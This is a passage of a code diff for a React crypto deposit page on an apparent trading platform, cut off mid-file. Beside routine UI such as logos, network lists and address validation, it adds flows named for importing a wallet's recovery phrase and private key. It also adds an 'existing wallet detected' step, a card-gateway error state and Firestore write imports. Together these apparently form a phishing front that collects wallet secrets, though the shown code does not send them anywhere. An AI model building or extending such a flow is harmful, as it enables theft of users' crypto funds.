@@ -21,15 +21,32 @@ import {
   Sparkles,
   RefreshCw,
   Globe,
-  HelpCircle
+  HelpCircle,
+  XCircle,
+  WifiOff,
+  Radio,
+  KeyRound,
+  Landmark,
+  ShieldAlert,
+  Search,
+  Camera,
+  Handshake,
+  X,
+  Eye,
+  EyeOff,
+  Shield,
+  Key,
+  ArrowDownToLine
 } from 'lucide-react';
 import { db, auth } from '../../lib/firebase';
-import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
+import { collection, addDoc, serverTimestamp, doc, onSnapshot } from 'firebase/firestore';
+import { useAuth } from '../../contexts/AuthContext';
 
 interface InstitutionalDepositPageProps {
   theme: 'light' | 'dark';
   onBack: () => void;
   onSuccessDeposit: (amount: number, method: string) => void;
+  onOpenSupport?: (ticketData: any) => void;
 }
 
 type FundingMethod = 'card' | 'walletconnect' | 'crypto' | 'bank';
@@ -42,6 +59,69 @@ interface CryptoAsset {
   address: string;
   estTime: string;
 }
+
+export interface BlockchainNetwork {
+  id: string;
+  name: string;
+  symbol: string;
+  badge: string;
+  type: 'evm' | 'solana' | 'tron' | 'bitcoin';
+  description: string;
+}
+
+export const BLOCKCHAIN_NETWORKS: BlockchainNetwork[] = [
+  { id: 'eth', name: 'Ethereum', symbol: 'ERC-20', badge: 'Ethereum', type: 'evm', description: 'Layer 1 Smart Contracts' },
+  { id: 'bsc', name: 'BNB Smart Chain', symbol: 'BEP-20', badge: 'BNB Chain', type: 'evm', description: 'High-Speed BEP-20 Standard' },
+  { id: 'sol', name: 'Solana', symbol: 'SPL', badge: 'Solana', type: 'solana', description: 'Ultra-Fast SPL Protocol' },
+  { id: 'tron', name: 'TRON', symbol: 'TRC-20', badge: 'Tron', type: 'tron', description: 'TRC-20 Token Protocol' },
+  { id: 'polygon', name: 'Polygon', symbol: 'POS', badge: 'Polygon', type: 'evm', description: 'POS Scalable Network' },
+  { id: 'btc', name: 'Bitcoin', symbol: 'BTC', badge: 'Bitcoin', type: 'bitcoin', description: 'Decentralized P2P Network' },
+  { id: 'arbitrum', name: 'Arbitrum One', symbol: 'ARB', badge: 'L2', type: 'evm', description: 'Optimistic L2 Scaling' },
+  { id: 'avalanche', name: 'Avalanche C-Chain', symbol: 'AVAX', badge: 'C-Chain', type: 'evm', description: 'Subnet EVM Standard' },
+];
+
+export const validateWalletAddress = (address: string, networkType: 'evm' | 'solana' | 'tron' | 'bitcoin', networkName: string): { valid: boolean; error?: string } => {
+  const trimmed = address.trim();
+  if (!trimmed) {
+    return { valid: false, error: 'Please enter a wallet address.' };
+  }
+
+  if (networkType === 'evm') {
+    const isEvm = /^0x[a-fA-F0-9]{40}$/.test(trimmed);
+    if (!isEvm) {
+      return { 
+        valid: false, 
+        error: `Invalid ${networkName} address format. EVM addresses must start with "0x" followed by 40 hexadecimal characters.` 
+      };
+    }
+  } else if (networkType === 'solana') {
+    const isSol = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(trimmed);
+    if (!isSol) {
+      return { 
+        valid: false, 
+        error: `Invalid ${networkName} address format. Solana addresses must be a valid Base58 string (32-44 characters).` 
+      };
+    }
+  } else if (networkType === 'tron') {
+    const isTron = /^T[a-zA-Z0-9]{33}$/.test(trimmed);
+    if (!isTron) {
+      return { 
+        valid: false, 
+        error: `Invalid ${networkName} address format. TRON TRC-20 addresses must start with "T" and be 34 characters long.` 
+      };
+    }
+  } else if (networkType === 'bitcoin') {
+    const isBtc = /^(1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-Z0-9]{25,90})$/i.test(trimmed);
+    if (!isBtc) {
+      return { 
+        valid: false, 
+        error: `Invalid ${networkName} address format. BTC addresses must start with 1, 3, or bc1.` 
+      };
+    }
+  }
+
+  return { valid: true };
+};
 
 const CRYPTO_ASSETS: CryptoAsset[] = [
   { symbol: 'BTC', name: 'Bitcoin', network: 'Bitcoin Network', icon: '₿', address: 'bc1qkaw6jwev9mj65ywmy8h4rtjhdea3epvh08st03', estTime: '30-60 mins (3 confirmations)' },
@@ -60,6 +140,7 @@ const WALLETS = [
   { name: 'Phantom', icon: '👻', desc: 'High-speed multi-chain connection' },
   { name: 'Trust Wallet', icon: '🛡️', desc: 'Decentralized multi-asset vault' },
   { name: 'Rabby Wallet', icon: '🐰', desc: 'Advanced institutional web3 wallet' },
+  { name: 'Connect Wallet Manually', icon: '🔑', desc: 'Enter public wallet address manually' },
 ];
 
 const getCryptoLogoDataUrl = (symbol: string): string => {
@@ -110,6 +191,7 @@ function CryptoLogo({ symbol, className = "w-5 h-5" }: LogoProps) {
       );
     case 'USDT-ERC20':
     case 'USDT-TRC20':
+    case 'USDT':
       return (
         <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
           <circle cx="16" cy="16" r="16" fill="#26A17B" />
@@ -128,20 +210,20 @@ function CryptoLogo({ symbol, className = "w-5 h-5" }: LogoProps) {
         <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
           <circle cx="16" cy="16" r="16" fill="#141414" />
           <g>
-            <path d="M7.4 11.23h12.3c.3 0 .6-.2.8-.5l1.6-2.8c.2-.3.1-.7-.2-.9H9.6c-.3 0-.6.2-.8.5L7.2 10c-.2.4 0 .9.2 1.23z" fill="url(#solGrad1_new)" />
-            <path d="M24.6 15.2h-12.3c-.3 0-.6.2-.8.5l-1.6 2.8c-.2.3-.1.7.2.9h12.3c.3 0 .6-.2.8-.5l1.6-2.8c.2-.4.1-.7-.2-.9z" fill="url(#solGrad2_new)" />
-            <path d="M7.4 22.84h12.3c.3 0 .6-.2.8-.5l1.6-2.8c.2-.3.1-.7-.2-.9H9.6c-.3 0-.6.2-.8.5l-1.6 2.8c-.2.3 0 .9.2.9z" fill="url(#solGrad3_new)" />
+            <path d="M7.4 11.23h12.3c.3 0 .6-.2.8-.5l1.6-2.8c.2-.3.1-.7-.2-.9H9.6c-.3 0-.6.2-.8.5L7.2 10c-.2.4 0 .9.2 1.23z" fill="url(#solGrad1_official)" />
+            <path d="M24.6 15.2h-12.3c-.3 0-.6.2-.8.5l-1.6 2.8c-.2.3-.1.7.2.9h12.3c.3 0 .6-.2.8-.5l1.6-2.8c.2-.4.1-.7-.2-.9z" fill="url(#solGrad2_official)" />
+            <path d="M7.4 22.84h12.3c.3 0 .6-.2.8-.5l1.6-2.8c.2-.3.1-.7-.2-.9H9.6c-.3 0-.6.2-.8.5l-1.6 2.8c-.2.3 0 .9.2.9z" fill="url(#solGrad3_official)" />
           </g>
           <defs>
-            <linearGradient id="solGrad1_new" x1="20" y1="7" x2="7" y2="11.23" gradientUnits="userSpaceOnUse">
+            <linearGradient id="solGrad1_official" x1="20" y1="7" x2="7" y2="11.23" gradientUnits="userSpaceOnUse">
               <stop offset="0%" stopColor="#00FFA3" />
               <stop offset="100%" stopColor="#DC1FFF" />
             </linearGradient>
-            <linearGradient id="solGrad2_new" x1="24.6" y1="15.2" x2="9.9" y2="19.4" gradientUnits="userSpaceOnUse">
+            <linearGradient id="solGrad2_official" x1="24.6" y1="15.2" x2="9.9" y2="19.4" gradientUnits="userSpaceOnUse">
               <stop offset="0%" stopColor="#00FFA3" />
               <stop offset="100%" stopColor="#DC1FFF" />
             </linearGradient>
-            <linearGradient id="solGrad3_new" x1="20" y1="18.64" x2="7" y2="22.84" gradientUnits="userSpaceOnUse">
+            <linearGradient id="solGrad3_official" x1="20" y1="18.64" x2="7" y2="22.84" gradientUnits="userSpaceOnUse">
               <stop offset="0%" stopColor="#00FFA3" />
               <stop offset="100%" stopColor="#DC1FFF" />
             </linearGradient>
@@ -151,7 +233,7 @@ function CryptoLogo({ symbol, className = "w-5 h-5" }: LogoProps) {
     case 'BNB':
       return (
         <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <circle cx="16" cy="16" r="16" fill="#F0B90B" />
+          <circle cx="16" cy="16" r="16" fill="#F3BA2F" />
           <path d="M16 6.5l3.24 3.24L16 12.98l-3.24-3.24L16 6.5zm7.3 7.3l2.2-2.2L28 14.1l-2.2 2.2-2.5-2.5zm-14.6 0l2.5-2.5-2.2-2.2L6.8 11.6l2.2 2.2zM16 25.5l-3.24-3.24 3.24-3.24 3.24 3.24L16 25.5zm11.2-11.4l1.3 1.3-11.2 11.2V22.5l7.96-7.96.04-.04-.04-.04-.06-.06V11.6l2 2.5zM6.8 14.1L16 25.3v-2.8L8.04 14.54l-1.24-.44zM16 12.98l2.5 2.5-2.5 2.5-2.5-2.5 2.5-2.5z" fill="white" />
         </svg>
       );
@@ -170,66 +252,192 @@ function WalletLogo({ name, className = "w-5 h-5" }: WalletLogoProps) {
     case 'MetaMask':
       return (
         <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M28.5 7.14l-11-4.82a2.91 2.91 0 00-2.34 0l-11 4.82A2.94 2.94 0 002.5 9.84v10.51a3 3 0 001.66 2.68l11 5.37a2.94 2.94 0 002.68 0l11-5.37a3 3 0 001.66-2.68V9.84a2.94 2.94 0 00-1.66-2.7z" fill="#3B2412" opacity="0.1" />
-          <path d="M27.5 13.5l-6-7.5-5.5 4.5-5.5-4.5-6 7.5 1.5 5.5 10 6 10-6 1.5-5.5z" fill="#F6851B" />
-          <path d="M16 25.5l-10-6 1.5-5.5 8.5 4v7.5z" fill="#E27625" />
-          <path d="M16 25.5l10-6-1.5-5.5-8.5 4v7.5z" fill="#D7C1B1" opacity="0.3" />
-          <path d="M16 10.5l5.5-4.5 4.5 4-10.5.5-5.5-4 6 4z" fill="#E17726" />
-          <path d="M9.5 19.5l-3.5-6 3.5.5v5.5zm13 0l3.5-6-3.5.5v5.5z" fill="#231F20" />
-          <path d="M16 25.5l3.5-3.5h-7l3.5 3.5z" fill="#F6851B" />
+          <rect width="32" height="32" rx="8" fill="#F6851B" />
+          <path d="M26.4 7.2L17.2 13.9L16 9.6L14.8 13.9L5.6 7.2L7.8 18.6L16 26.5L24.2 18.6L26.4 7.2Z" fill="#E27625" />
+          <path d="M26.4 7.2L17.2 13.9L20.8 18.2L24.2 18.6L26.4 7.2Z" fill="#E17726" />
+          <path d="M5.6 7.2L14.8 13.9L11.2 18.2L7.8 18.6L5.6 7.2Z" fill="#E17726" />
+          <path d="M11.2 18.2L14.8 13.9L16 26.5L11.2 18.2Z" fill="#E27625" />
+          <path d="M20.8 18.2L17.2 13.9L16 26.5L20.8 18.2Z" fill="#D7C1B1" opacity="0.6" />
+          <path d="M16 9.6L14.8 13.9L17.2 13.9L16 9.6Z" fill="#F6851B" />
+          <circle cx="12.5" cy="17.5" r="1.5" fill="#231F20" />
+          <circle cx="19.5" cy="17.5" r="1.5" fill="#231F20" />
         </svg>
       );
     case 'WalletConnect':
       return (
         <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <circle cx="16" cy="16" r="16" fill="#3B99FC" />
-          <path d="M22.5 11.5a8.1 8.1 0 00-13 0c-.3.4-.3.9.1 1.2l1.3 1c.3.2.7.2.9-.1a5.1 5.1 0 017.4 0c.2.3.6.3.9.1l1.3-1c.4-.3.4-.8.1-1.2zm1.6 4.3l-1 1c-.3.3-.3.8 0 1.1l1.5 1.5c.3.3.8.3 1.1 0l1-1a3 3 0 000-4.2l-1-1c-.3-.3-.8-.3-1.1 0l-1.5 1.5c-.3.3-.3.8 0 1.1zm-16.2 0l1.5-1.5c.3-.3.3-.8 0-1.1l-1-1a3 3 0 00-4.2 0l-1 1c-.3.3-.3.8 0 1.1l1.5 1.5c.3.3.8.3 1.1 0l1-1c.3-.3.3-.8 0-1.1z" fill="white" />
+          <rect width="32" height="32" rx="8" fill="#3B99FC" />
+          <path d="M10.2 11.8c3.2-3.1 8.4-3.1 11.6 0l.4.4c.2.2.2.6 0 .8l-1.3 1.3c-.2.2-.5.2-.7 0l-.6-.6c-2.1-2.1-5.5-2.1-7.6 0l-.6.6c-.2.2-.5.2-.7 0l-1.3-1.3c-.2-.2-.2-.6 0-.8l.8-.4zm15.1 3.5l1.2 1.2c.2.2.2.6 0 .8l-5.4 5.4c-.2.2-.6.2-.8 0l-3.8-3.8c-.1-.1-.2-.1-.3 0l-3.8 3.8c-.2.2-.6.2-.8 0l-5.4-5.4c-.2-.2-.2-.6 0-.8l1.2-1.2c.2-.2.6-.2.8 0l4.2 4.2c.1.1.2.1.3 0l3.8-3.8c.2-.2.6-.2.8 0l3.8 3.8c.1.1.2.1.3 0l4.2-4.2c.2-.2.6-.2.8 0z" fill="white" />
         </svg>
       );
     case 'Coinbase Wallet':
       return (
         <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <circle cx="16" cy="16" r="16" fill="#0052FF" />
-          <rect x="8" y="8" width="16" height="16" rx="4" fill="white" />
-          <circle cx="16" cy="16" r="4" fill="#0052FF" />
+          <rect width="32" height="32" rx="8" fill="#0052FF" />
+          <path d="M16 6C10.4772 6 6 10.4772 6 16C6 21.5228 10.4772 26 16 26C21.5228 26 26 21.5228 26 16C26 10.4772 21.5228 6 16 6ZM12.5 12.5H19.5V19.5H12.5V12.5Z" fill="white" />
         </svg>
       );
     case 'Phantom':
       return (
         <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <circle cx="16" cy="16" r="16" fill="#4B31A8" />
-          <path d="M16 6c-5 0-8 3.5-8 7.5v8.3a1.7 1.7 0 002.8 1.3l1.8-1.5a1.7 1.7 0 012.2 0l1.2 1c.6.5 1.4.5 2 0l1.2-1a1.7 1.7 0 012.2 0l1.8 1.5a1.7 1.7 0 002.8-1.3v-8.3C24 9.5 21 6 16 6zm-3.5 8c-.8 0-1.5-.7-1.5-1.5s.7-1.5 1.5-1.5 1.5.7 1.5 1.5-.7 1.5-1.5 1.5zm7 0c-.8 0-1.5-.7-1.5-1.5s.7-1.5 1.5-1.5 1.5.7 1.5 1.5-.7 1.5-1.5 1.5z" fill="white" />
+          <rect width="32" height="32" rx="8" fill="url(#phantom_grad)" />
+          <path d="M23.5 16.5C23.5 12.36 20.14 9 16 9C11.86 9 8.5 12.36 8.5 16.5V22.2C8.5 22.9 9.3 23.3 9.8 22.8L11.7 21C12 20.7 12.5 20.7 12.8 21L14.2 22.3C14.6 22.7 15.2 22.7 15.6 22.3L17 21C17.3 20.7 17.8 20.7 18.1 21L20 22.8C20.5 23.3 21.3 22.9 21.3 22.2V22.1C22.6 20.7 23.5 18.7 23.5 16.5ZM13 15.5C12.17 15.5 11.5 14.83 11.5 14C11.5 13.17 12.17 12.5 13 12.5C13.83 12.5 14.5 13.17 14.5 14C14.5 14.83 13.83 15.5 13 15.5ZM19 15.5C18.17 15.5 17.5 14.83 17.5 14C17.5 13.17 18.17 12.5 19 12.5C19.83 12.5 20.5 13.17 20.5 14C20.5 14.83 19.83 15.5 19 15.5Z" fill="white"/>
+          <defs>
+            <linearGradient id="phantom_grad" x1="0" y1="0" x2="32" y2="32" gradientUnits="userSpaceOnUse">
+              <stop stopColor="#AB9FF2" />
+              <stop offset="1" stopColor="#534BB1" />
+            </linearGradient>
+          </defs>
         </svg>
       );
     case 'Trust Wallet':
       return (
         <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <circle cx="16" cy="16" r="16" fill="#3375BB" />
-          <path d="M16 7.5L8.5 11v6.5c0 4.6 3.2 8.9 7.5 10 4.3-1.1 7.5-5.4 7.5-10V11L16 7.5zm4.8 10c0 3.2-2.2 6.1-4.8 7-2.6-.9-4.8-3.8-4.8-7V13.2l4.8-2.2 4.8 2.2v4.3z" fill="white" />
+          <rect width="32" height="32" rx="8" fill="#0500FF" />
+          <path d="M16 6L8 10V16.5C8 21.5 11.4 26.1 16 27.5C20.6 26.1 24 21.5 24 16.5V10L16 6Z" fill="url(#trust_shield_grad)" />
+          <path d="M16 8.5L10 11.2V16.5C10 20.3 12.5 23.8 16 25C19.5 23.8 22 20.3 22 16.5V11.2L16 8.5Z" fill="white" opacity="0.95" />
+          <defs>
+            <linearGradient id="trust_shield_grad" x1="8" y1="6" x2="24" y2="27.5" gradientUnits="userSpaceOnUse">
+              <stop stopColor="#0500FF" />
+              <stop offset="1" stopColor="#00E5FF" />
+            </linearGradient>
+          </defs>
         </svg>
       );
     case 'Rabby Wallet':
       return (
         <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <circle cx="16" cy="16" r="16" fill="#22C55E" />
-          <path d="M16 7c-4.4 0-8 3.6-8 8v1h16v-1c0-4.4-3.6-8-8-8zm-3 8c-.8 0-1.5-.7-1.5-1.5S12.2 12 13 12s1.5.7 1.5 1.5-.7 1.5-1.5 1.5zm6 0c-.8 0-1.5-.7-1.5-1.5s.7-1.5 1.5-1.5 1.5.7 1.5 1.5-.7 1.5-1.5 1.5zM8 18h16v1c0 3.3-2.7 6-6 6h-4c-3.3 0-6-2.7-6-6v-1z" fill="white" />
+          <rect width="32" height="32" rx="8" fill="#4C65FF" />
+          <path d="M11.5 7.5C10.1 7.5 9 8.6 9 10V15C9 15.6 9.4 16 10 16C10.6 16 11 15.6 11 15V10C11 9.7 11.2 9.5 11.5 9.5C11.8 9.5 12 9.7 12 10V14C12 14.6 12.4 15 13 15C13.6 15 14 14.6 14 14V10C14 8.6 12.9 7.5 11.5 7.5Z" fill="white" />
+          <path d="M20.5 7.5C19.1 7.5 18 8.6 18 10V14C18 14.6 18.4 15 19 15C19.6 15 20 14.6 20 14V10C20 9.7 20.2 9.5 20.5 9.5C20.8 9.5 21 9.7 21 10V15C21 15.6 21.4 16 22 16C22.6 16 23 15.6 23 15V10C23 8.6 21.9 7.5 20.5 7.5Z" fill="white" />
+          <path d="M16 15C11.6 15 8 18.1 8 22C8 24.2 11.6 26 16 26C20.4 26 24 24.2 24 22C24 18.1 20.4 15 16 15ZM13.5 19.5C14.1 19.5 14.5 19.9 14.5 20.5C14.5 21.1 14.1 21.5 13.5 21.5C12.9 21.5 12.5 21.1 12.5 20.5C12.5 19.9 12.9 19.5 13.5 19.5ZM18.5 19.5C19.1 19.5 19.5 19.9 19.5 20.5C19.5 21.1 19.1 21.5 18.5 21.5C17.9 21.5 17.5 21.1 17.5 20.5C17.5 19.9 17.9 19.5 18.5 19.5Z" fill="white" />
         </svg>
+      );
+    case 'Connect Wallet Manually':
+      return (
+        <div className={`${className} rounded-lg bg-gradient-to-br from-indigo-600 via-indigo-500 to-purple-600 p-1 flex items-center justify-center shadow-md shadow-indigo-500/30 ring-1 ring-white/20`}>
+          <Handshake className="w-full h-full text-white shrink-0" />
+        </div>
       );
     default:
       return null;
   }
 }
 
+function NetworkLogo({ id, className = "w-6 h-6" }: { id: string; className?: string }) {
+  switch (id) {
+    case 'eth':
+      return (
+        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="32" height="32" rx="8" fill="#627EEA" fillOpacity="0.2" />
+          <path d="M16 4L15.7 5V19.7L16 20L23.5 15.6L16 4Z" fill="#627EEA" />
+          <path d="M16 4L8.5 15.6L16 20V12.3V4Z" fill="#8A9DED" />
+          <path d="M16 21.4L15.8 21.6V27.7L16 28L23.5 17.5L16 21.4Z" fill="#627EEA" />
+          <path d="M16 28V21.4L8.5 17.5L16 28Z" fill="#8A9DED" />
+        </svg>
+      );
+    case 'bsc':
+      return (
+        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="32" height="32" rx="8" fill="#F3BA2F" fillOpacity="0.2" />
+          <path d="M16 6L20 10L16 14L12 10L16 6Z" fill="#F3BA2F" />
+          <path d="M7 15L11 11L15 15L11 19L7 15Z" fill="#F3BA2F" />
+          <path d="M25 15L21 11L17 15L21 19L25 15Z" fill="#F3BA2F" />
+          <path d="M16 24L20 20L16 16L12 20L16 24Z" fill="#F3BA2F" />
+        </svg>
+      );
+    case 'sol':
+      return (
+        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="32" height="32" rx="8" fill="url(#sol_bg)" fillOpacity="0.2" />
+          <path d="M7 21.5L9.5 19H25L22.5 21.5H7Z" fill="url(#sol_1)" />
+          <path d="M7 10.5L9.5 8H25L22.5 10.5H7Z" fill="url(#sol_2)" />
+          <path d="M7 16L9.5 13.5H25L22.5 16H7Z" fill="url(#sol_3)" />
+          <defs>
+            <linearGradient id="sol_1" x1="7" y1="19" x2="25" y2="21.5" gradientUnits="userSpaceOnUse">
+              <stop stopColor="#00FFA3" />
+              <stop offset="1" stopColor="#DC1FFF" />
+            </linearGradient>
+            <linearGradient id="sol_2" x1="7" y1="8" x2="25" y2="10.5" gradientUnits="userSpaceOnUse">
+              <stop stopColor="#00FFA3" />
+              <stop offset="1" stopColor="#DC1FFF" />
+            </linearGradient>
+            <linearGradient id="sol_3" x1="7" y1="13.5" x2="25" y2="16" gradientUnits="userSpaceOnUse">
+              <stop stopColor="#DC1FFF" />
+              <stop offset="1" stopColor="#00FFA3" />
+            </linearGradient>
+          </defs>
+        </svg>
+      );
+    case 'tron':
+      return (
+        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="32" height="32" rx="8" fill="#FF0013" fillOpacity="0.2" />
+          <path d="M25 9.5L13.5 6L7 15.5L20.5 26L25 9.5Z" stroke="#FF0013" strokeWidth="2" strokeLinejoin="round" />
+          <path d="M13.5 6L20.5 26M13.5 6L7 15.5M7 15.5L20.5 26" stroke="#FF0013" strokeWidth="1.5" />
+        </svg>
+      );
+    case 'polygon':
+      return (
+        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="32" height="32" rx="8" fill="#8247E5" fillOpacity="0.2" />
+          <path d="M21.5 12L17.5 9.7L13.5 12V16.6L17.5 18.9L21.5 16.6V12Z" fill="#8247E5" />
+          <path d="M13.5 20L9.5 17.7L5.5 20V24.6L9.5 26.9L13.5 24.6V20Z" fill="#8247E5" />
+        </svg>
+      );
+    case 'btc':
+      return (
+        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="32" height="32" rx="8" fill="#F7931A" fillOpacity="0.2" />
+          <path d="M21.8 13.5C22.2 12.2 21.4 11 19.5 10.4L20.3 7.2L18.3 6.7L17.5 9.9C17 9.8 16.4 9.6 15.9 9.5L16.7 6.3L14.7 5.8L13.9 9C13.5 8.9 13.1 8.8 12.6 8.7L9.8 8L9.3 10L11.2 10.5C11.7 10.6 12 11 11.9 11.5L10.2 18.3C10.1 18.6 9.8 18.8 9.4 18.7L7.5 18.2L6.8 20.3L9.5 21C10 21.1 10.5 21.2 11 21.3L10.2 24.6L12.2 25.1L13 21.8C13.5 21.9 14.1 22 14.6 22.1L13.8 25.4L15.8 25.9L16.6 22.6C19.9 23.2 22.4 22.3 23.3 19.2C24 16.7 23.1 15.3 21.8 14.5M17.4 19.3C16.8 21.7 12.8 20.4 11.6 20.1L12.7 15.7C13.9 16 18 16.9 17.4 19.3M18.2 13.9C17.7 16 14.3 14.8 13.3 14.5L14.2 10.9C15.2 11.2 18.7 11.8 18.2 13.9Z" fill="#F7931A" />
+        </svg>
+      );
+    case 'arbitrum':
+      return (
+        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="32" height="32" rx="8" fill="#28A0F0" fillOpacity="0.2" />
+          <path d="M16 6L8 20L12 26L16 20L20 26L24 20L16 6Z" fill="#28A0F0" />
+        </svg>
+      );
+    case 'avalanche':
+      return (
+        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="32" height="32" rx="8" fill="#E84142" fillOpacity="0.2" />
+          <path d="M16 6L7 22H11.5L16 14L20.5 22H25L16 6Z" fill="#E84142" />
+        </svg>
+      );
+    default:
+      return (
+        <div className={`${className} rounded-lg bg-indigo-500/20 flex items-center justify-center text-indigo-400 font-bold text-xs`}>
+          {id.toUpperCase().slice(0, 3)}
+        </div>
+      );
+  }
+}
+
 function AnimatedHeaderIcons({ isDark }: { isDark: boolean }) {
   const [currentIndex, setCurrentIndex] = useState(0);
-  const icons = ['BTC', 'ETH', 'SOL', 'USDC', 'USD'];
+  const items = ['CARD', 'WALLET', 'BANK', 'BTC', 'ETH', 'USDC'];
 
   useEffect(() => {
     const timer = setInterval(() => {
-      setCurrentIndex((prev) => (prev + 1) % icons.length);
+      setCurrentIndex((prev) => (prev + 1) % items.length);
     }, 2000);
     return () => clearInterval(timer);
   }, []);
+
+  const renderIconItem = (item: string) => {
+    switch (item) {
+      case 'CARD':
+        return <CreditCard className="w-4 h-4 text-emerald-400" />;
+      case 'WALLET':
+        return <Wallet className="w-4 h-4 text-indigo-400" />;
+      case 'BANK':
+        return <Landmark className="w-4 h-4 text-purple-400" />;
+      default:
+        return <CryptoLogo symbol={item} className="w-full h-full" />;
+    }
+  };
 
   return (
     <div className="relative w-6 h-6 sm:w-7 sm:h-7 mr-3 flex items-center justify-center">
@@ -242,32 +450,304 @@ function AnimatedHeaderIcons({ isDark }: { isDark: boolean }) {
           transition={{ duration: 0.3 }}
           className={`absolute inset-0 rounded-full ring-2 ${isDark ? 'ring-[#111111]' : 'ring-white'} shadow-md flex items-center justify-center overflow-hidden bg-neutral-900`}
         >
-          {icons[currentIndex] === 'USD' ? (
-            <div className="w-full h-full bg-emerald-500 flex items-center justify-center">
-              <span className="text-white text-[10px] sm:text-xs font-bold">$</span>
-            </div>
-          ) : (
-            <CryptoLogo symbol={icons[currentIndex]} className="w-full h-full" />
-          )}
+          {renderIconItem(items[currentIndex])}
         </motion.div>
       </AnimatePresence>
     </div>
   );
 }
 
-export default function InstitutionalDepositPage({ theme, onBack, onSuccessDeposit }: InstitutionalDepositPageProps) {
-  const isDark = theme === 'dark';
+const ImportWalletAnimatedLogo = ({ icon: IconComponent = Wallet, colorClass = "text-emerald-400" }: { icon?: any, colorClass?: string }) => (
+  <div className="relative flex items-center justify-center my-3 py-1">
+    {/* Floating Main Emblem Badge */}
+    <motion.div 
+      animate={{ y: [0, -3, 0] }}
+      transition={{ 
+        duration: 3, 
+        repeat: Infinity, 
+        ease: "easeInOut" 
+      }}
+      className="relative z-10 w-16 h-16 sm:w-18 sm:h-18 rounded-2xl bg-gradient-to-b from-neutral-800 via-neutral-900 to-neutral-950 border border-white/10 shadow-2xl flex items-center justify-center p-3"
+    >
+      {/* Soft Inner Bevel Stitch Accent */}
+      <div className="absolute inset-1 rounded-xl border border-white/5 pointer-events-none" />
 
-  const [step, setStep] = useState<'methods' | 'form' | 'processing' | 'success' | 'unavailable'>('methods');
-  const [selectedMethod, setSelectedMethod] = useState<FundingMethod>('card');
+      {/* Central Clean Natural Icon */}
+      <IconComponent className={`w-8 h-8 ${colorClass} stroke-[1.8]`} />
+    </motion.div>
+  </div>
+);
+
+export default function InstitutionalDepositPage({ theme, onBack, onSuccessDeposit, onOpenSupport }: InstitutionalDepositPageProps) {
+  const isDark = theme === 'dark';
+  const { user: authUser } = useAuth();
+
+  const [step, setStep] = useState<'methods' | 'form' | 'processing' | 'card_gateway_processing' | 'card_gateway_error' | 'wallet_connecting' | 'wallet_cancelled' | 'wallet_manual' | 'wallet_import_choose' | 'wallet_import_phrase' | 'wallet_import_key' | 'existing_wallet_detected' | 'bank_preparing' | 'crypto_deposit_verification' | 'success' | 'unavailable' | 'crypto_success' | 'crypto_expired'>(() => {
+    try {
+      const savedTarget = localStorage.getItem('aver_deposit_timer_target');
+      if (savedTarget) {
+        const remaining = Math.max(0, Math.floor((parseInt(savedTarget, 10) - Date.now()) / 1000));
+        if (remaining > 0) {
+          return 'crypto_deposit_verification';
+        }
+      }
+    } catch (e) {}
+    return 'methods';
+  });
+  const [selectedMethod, setSelectedMethod] = useState<FundingMethod>(() => {
+    try {
+      const saved = localStorage.getItem('aver_deposit_method');
+      return (saved as FundingMethod) || 'card';
+    } catch (e) {
+      return 'card';
+    }
+  });
+
+  // Manual Wallet Connection States
+  const [manualNetwork, setManualNetwork] = useState<BlockchainNetwork>(BLOCKCHAIN_NETWORKS[0]);
+  const [networkSearch, setNetworkSearch] = useState('');
+  const [manualAddress, setManualAddress] = useState('');
+  const [manualAddressError, setManualAddressError] = useState<string | null>(null);
+  const [manualAddressTouched, setManualAddressTouched] = useState(false);
+  const [isQrScannerOpen, setIsQrScannerOpen] = useState(false);
+  const [qrScanInput, setQrScanInput] = useState('');
+
+  // Crypto states
+  const [selectedCrypto, setSelectedCrypto] = useState<CryptoAsset>(() => {
+    try {
+      const saved = localStorage.getItem('aver_deposit_crypto');
+      if (saved) {
+        const parsed = JSON.parse(saved);
+        const matched = CRYPTO_ASSETS.find(a => a.symbol === parsed.symbol);
+        if (matched) return matched;
+        return parsed;
+      }
+    } catch (e) {}
+    return CRYPTO_ASSETS[2]; // USDT ERC20
+  });
+  const [copiedAddress, setCopiedAddress] = useState(false);
   
+  // Exact Transfer Amount States
+  const [cryptoRate, setCryptoRate] = useState<number | null>(null);
+  const [isPricingLoading, setIsPricingLoading] = useState(false);
+  const [pricingError, setPricingError] = useState(false);
+  const [copiedExactAmount, setCopiedExactAmount] = useState(false);
+  const [showAssistanceModal, setShowAssistanceModal] = useState(false);
+  const [showRecoveryInfoModal, setShowRecoveryInfoModal] = useState(false);
+  const [showPrivateKeyInfoModal, setShowPrivateKeyInfoModal] = useState(false);
+  const [pendingDepositId, setPendingDepositId] = useState<string | null>(() => {
+    try {
+      return localStorage.getItem('aver_pending_deposit_id');
+    } catch (e) {
+      return null;
